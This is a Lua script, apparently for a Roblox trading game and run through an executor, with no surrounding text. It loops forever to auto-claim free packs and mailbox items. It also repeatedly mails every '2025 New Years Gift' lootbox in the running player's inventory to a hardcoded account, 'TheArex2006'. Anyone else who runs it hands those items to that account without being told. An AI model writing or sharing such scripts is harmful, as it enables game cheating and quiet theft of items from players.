spawn(function()
    while true do
        pcall(function() 
            game:GetService("ReplicatedStorage").Network["ForeverPacks: Claim Free"]:InvokeServer("Default")
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)


spawn(function()
    while true do
        pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)

spawn(function()
    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local username = "TheArex2006"
    local loopInterval = 5 
    while true do
        local playerInventory = Save.Get()["Inventory"]
        local LootboxInv = playerInventory["Lootbox"]
        print("Searching for 2025 New Years Gift...")
        for key, item in pairs(LootboxInv) do
            if item.id == "2025 New Years Gift" then
                print("Found 2025 New Years Gift item:", item)
                local amount = item._am or item.am or 1
                print("Amount to send:", amount)
                local args = {
                    [1] = username,
                    [2] = "Take these gifts",
                    [3] = "Lootbox",
                    [4] = key,
                    [5] = amount
                }
                print("Invoking Server with args:", unpack(args))
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                break
            end
        end
        print("Finished processing 2025 New Years Gifts.")
        task.wait(loopInterval * 60)
    end
end)
